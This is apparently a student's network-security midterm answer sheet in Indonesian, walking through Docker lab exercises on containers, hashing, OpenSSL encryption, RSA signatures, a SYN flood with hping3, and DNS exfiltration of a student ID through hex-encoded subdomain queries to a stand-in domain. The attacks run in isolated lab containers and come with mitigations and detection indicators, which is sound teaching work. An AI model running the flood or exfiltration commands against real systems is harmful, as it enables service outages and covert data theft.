# JAWABAN UTS Network Security

**NIM:** 24552011306
**Kasus:** 9

## Perhitungan Kasus
- Digit NIM: [2, 4, 5, 5, 2, 0, 1, 1, 3, 0, 6]
- Jumlah: [29]
- Sisa bagi 10: [9]
- Kasus: [9]

## BAGIAN A

## A1. Container dasar dan port mapping
Jalankan kontainer Nginx di latar belakang, petakan port 8080 host ke port 80 kontainer, verifikasi statusnya, lakukan pengujian akses HTTP, dan baca bagian awal konfigurasinya.
  ```
  docker run -d --name web-uts -p 8080:80 nginx:alpine
  docker ps
  curl http://localhost:8080
  docker exec web-uts head -n 5 /etc/nginx/nginx.conf
  ```
Hasil Praktikum :
<img width="2880" height="1800" alt="A1" src="https://github.com/user-attachments/assets/e167dc56-d8af-49c0-8520-0c0a05885e03" />
Penjelasan:
  - Perintah docker run -d -p 8080:80 mengunduh dan menjalankan image nginx:alpine di latar belakang (-d) sambil membuka akses port 8080 pada            komputer host menuju port 80 di dalam kontainer.
  - docker ps menampilkan daftar kontainer yang sedang berjalan.
  - curl menguji apakah server web Nginx merespons permintaan halaman utama, dan perintah docker exec membaca 5 baris pertama file konfigurasi utama     Nginx (nginx.conf) di dalam kontainer.

## A2. Persistensi Volume
Membuat volume Docker mandiri agar data tetap aman dan persisten meskipun kontainer dihapus.
  ```
  docker volume create data-uts
  docker run --name w1 -v data-uts:/data alpine sh -c 'echo 24552011306 > /data/catatan.txt'
  docker rm w1
  docker run --rm -v data-uts:/data alpine cat /data/catatan.txt
  ```
Hasil Praktikum :
<img width="2880" height="570" alt="A2" src="https://github.com/user-attachments/assets/75df40b7-99c2-4575-82cb-1e3fcb4d4b1b" />
Penjelasan :
  - docker volume create data-uts: Membuat penyimpanan data terisolasi di luar siklus hidup kontainer.
  - Kontainer w1 menuliskan NIM (24552011306) ke dalam file /data/catatan.txt.
  - Meskipun kontainer w1 dihapus (docker rm w1), data tetap aman di dalam volume dan dapat dibaca kembali oleh kontainer baru.

## A3. Integritas File dengan Hash
Menguji sensitivitas fungsi kriptografi hash (MD5 dan SHA-256) terhadap perubahan data sekecil apa pun.
  ```
  echo 'pesan rahasia' > pesan.txt
  md5sum pesan.txt
  sha256sum pesan.txt
  sed -i 's/pesan/pesaN/' pesan.txt
  md5sum pesan.txt
  sha256sum pesan.txt
  ```
Hasil Praktikum :
<img width="2880" height="586" alt="A3" src="https://github.com/user-attachments/assets/6d089ba0-3870-4950-aa3d-d105ffe85d31" />
Penjelasan :
  - Nilai checksum dihitung sebelum dan sesudah isi file diubah menggunakan sed.
  - Perubahan satu huruf saja menyebabkan nilai hash (MD5 maupun SHA-256) berubah secara total (avalanche effect), membuktikan keandalan fungsi hash     dalam menjaga integritas data.

## A4. Enkripsi Simetris dengan OpenSSL
Mengamankan file teks menggunakan algoritma enkripsi simetris AES-256-CBC, serta menguji dekripsi dengan sandi benar dan salah.
  ```
  openssl enc -aes-256-cbc -pbkdf2 -salt -in pesan.txt -out pesan.enc -pass pass:kunci123
  openssl enc -d -aes-256-cbc -pbkdf2 -in pesan.enc -pass pass:kunci123
  openssl enc -d -aes-256-cbc -pbkdf2 -in pesan.enc -pass pass:salah
  openssl enc -aes-256-cbc -pbkdf2 -salt -a -in pesan.txt -pass pass:kunci123
  ```
Hasil Praktikum :
<img width="2880" height="538" alt="A4" src="https://github.com/user-attachments/assets/027cc0df-52c3-43fd-8abf-530422bf3aa5" />
Penjelasan :
  - Enkripsi dilakukan menggunakan AES-256-CBC dengan proteksi PBKDF2 dan kunci sandi kunci123.
  - Dekripsi dengan password benar berhasil memulihkan teks asli, sedangkan password salah memunculkan error bad decrypt. Parameter -a digunakan         untuk format keluaran Base64.

## A5. Jaringan Bridge dan Akses Antar-Kontainer
Membangun jaringan bridge kustom agar beberapa kontainer dapat saling berkomunikasi secara internal.
  ```
  docker network create lab-net
  docker run -d --name host-a --network lab-net alpine sleep infinity
  docker run -d --name host-b --network lab-net alpine sleep infinity
  docker run -d --name dvwa --network lab-net vulnerables/web-dvwa
  docker exec host-a ping -c 3 host-b
  docker exec host-a wget -S -O /dev/null http://dvwa/login.php
  ```
Hasil Praktikum :
<img width="2880" height="1800" alt="A5" src="https://github.com/user-attachments/assets/5b3dfeff-bc46-410e-9005-094a53e0571e" />
Penjelasan :
  - Jaringan kustom lab-net memungkinkan resolusi nama host antar-kontainer secara otomatis.
  - Uji coba ping dan wget membuktikan konektivitas jaringan lapisan 3 serta akses HTTP internal antar-kontainer berjalan dengan sukses.


## BAGIAN A

## B1. Docker Compose Multi-Container Terisolasi
Membuat dan menjalankan arsitektur multi-container menggunakan Docker Compose pada jaringan internal terisolasi (`internal: true`) tanpa membuka *port* publik ke host.
  ```
  cd b/b1-compose
  docker compose up -d
  docker compose exec attacker wget -qO- http://target
  docker compose down -v
  ```
Hasil Praktikum :
<img width="2880" height="1800" alt="B1" src="https://github.com/user-attachments/assets/7d0fff41-d04a-4bae-bd4c-0b6c50f64f4e" />
Penjelasan :
  - Perintah dijalankan:
Layanan target (Nginx) dan attacker (Alpine) dijalankan di dalam jaringan virtual lab dengan parameter internal: true.Kontainer attacker berhasil mengakses halaman web target secara internal menggunakan utilitas wget.
  - Mengapa curl http://localhost dari host tidak bisa mencapai target?
Karena jaringan Docker dikonfigurasi dengan opsi internal: true yang memutus akses internet dan komunikasi eksternal dari luar jaringan virtual tersebut. Selain itu, service target tidak memiliki pemetaan port (ports) ke mesin host, sehingga komputer host tidak memiliki jalur masuk (route) atau port binding untuk meneruskan permintaan HTTP dari luar kontainer.

## B2. Kriptografi RSA dan Sertifikat
Melakukan pembangkitan kunci asimetris RSA, penandatanganan digital (digital signature), verifikasi integritas pesan, serta pembuatan dan pemeriksaan sertifikat X.509 (self-signed).
  ```
  docker run --rm -it -v "$PWD":/work uts-openssl sh

  # Di dalam kontainer:
  openssl genrsa -out priv.pem 2048
  openssl rsa -in priv.pem -pubout -out pub.pem
  echo 'pesan untuk ditandatangani' > pesan.txt
  openssl dgst -sha256 -sign priv.pem -out sig.bin pesan.txt
  openssl dgst -sha256 -verify pub.pem -signature sig.bin pesan.txt
  echo 'diubah' >> pesan.txt
  openssl dgst -sha256 -verify pub.pem -signature sig.bin pesan.txt
  openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 30 -subj /CN=lab.uts.local
  openssl x509 -in cert.pem -noout -subject -issuer -dates
  ```
Hasil Praktikum :
<img width="2880" height="1800" alt="B2" src="https://github.com/user-attachments/assets/aa009331-9ef0-4af7-ab06-a4e745871527" />
Penjelasan :
  - Hasil Eksekusi:
Proses verifikasi pertama menghasilkan Verified OK saat file asli divalidasi dengan kunci publik. Setelah isi file diubah, verifikasi menghasilkan Verification Failure, yang membuktikan bahwa tanda tangan digital melindungi integritas data dari manipulasi.
  - Perbedaan Sertifikat Self-Signed dan CA:
Sertifikat self-signed ditandatangani oleh pembuatnya sendiri tanpa divalidasi oleh otoritas terpercaya, sehingga sering memicu peringatan keamanan pada sistem atau peramban web. Sebaliknya, sertifikat yang ditandatangani oleh Certificate Authority (CA) tepercaya divalidasi oleh pihak ketiga yang independen, sehingga otomatis diakui keaslian dan kepercayaannya oleh sistem secara global.   

## B3. SYN Flood dan Deteksinya
Mensimulasikan serangan Denial of Service (DoS) berjenis SYN Flood menggunakan alat uji hping3 serta mengamati lonjakan antrean koneksi setengah terbuka (SYN_RECV) pada server target.
  ```
  cd b/b3-syn-flood
  docker compose up -d
  docker compose exec target netstat -ant | grep -c SYN_RECV
  docker compose exec -d attacker timeout 15 hping3 -S -p 80 --flood target
  docker compose exec target netstat -ant | grep -c SYN_RECV
  docker compose exec target sysctl -w net.ipv4.tcp_syncookies=1
  docker compose down -v
  ```
Hasil Praktikum
<img width="2880" height="940" alt="B3" src="https://github.com/user-attachments/assets/e031c976-1bef-42a7-b933-a03668bf5081" />
Penjelasan :
  - Jumlah SYN_RECV sebelum serangan:
Bernilai 0 (kondisi normal tanpa koneksi tertunda).
  - Menjalankan serangan:
Pengiriman paket SYN secara membabi-buta (flooding) dilakukan dari kontainer attacker ke port 80 target selama 15 detik.     - Jumlah SYN_RECV saat serangan: Melonjak naik (misalnya menjadi 1 atau lebih tinggi pada antrean terbatas lab) yang menunjukkan sumber daya           memori server mulai terbebani oleh handshake palsu.
  - Mitigasi (SYN Cookies):
Fitur SYN cookies mengizinkan server merespons permintaan SYN tanpa mengalokasikan memori backlog di awal; server baru       mengalokasikan sumber daya setelah menerima paket ACK yang sah, sehingga memblokir potensi kelumpuhan memori akibat SYN flood.   
  
  ## B4. DNS Exfiltration Lewat Subdomain
  Menyelundupkan data rahasia (NIM mahasiswa) ke luar jaringan melalui label subdomain pada kueri protokol DNS standar.  
  ```
  cd b/b4-dns-exfil
  docker compose up -d
  echo -n '24552011306' | xxd -p
  docker compose exec attacker dig +short 3234353532303131333036.exfil.lab @dns
  docker compose logs dns | grep exfil.lab
  echo '3234353532303131333036' | xxd -r -p
  docker compose down -v
  ```
Hasil Praktikum 
<img width="2860" height="994" alt="B4" src="https://github.com/user-attachments/assets/688076b7-64e0-4d64-b744-9abdebe0a1b5" />
Penjelasan :
  - Hasil Eksekusi:
NIM 24552011306 dikonversi ke format heksadesimal (3234353532303131333036), disisipkan ke kueri DNS, berhasil terekam di log server DNS, dan didekode kembali menjadi teks asli dengan sukses.
  - Mengapa teknik ini sulit diblokir firewall biasa?
Karena protokol DNS (menggunakan port UDP 53) merupakan layanan fundamental yang mutlak diizinkan keluar-masuk jaringan korporat atau publik untuk aktivitas internet sehari-hari, sehingga firewall konvensional jarang mencurigai kueri DNS yang membawa muatan tersembunyi.
  - Indikator Deteksi:
Adanya lonjakan frekuensi permintaan kueri DNS berulang dengan panjang label subdomain yang tidak normal, acak, atau memiliki tingkat entropi tinggi menuju domain eksternal yang sama. 
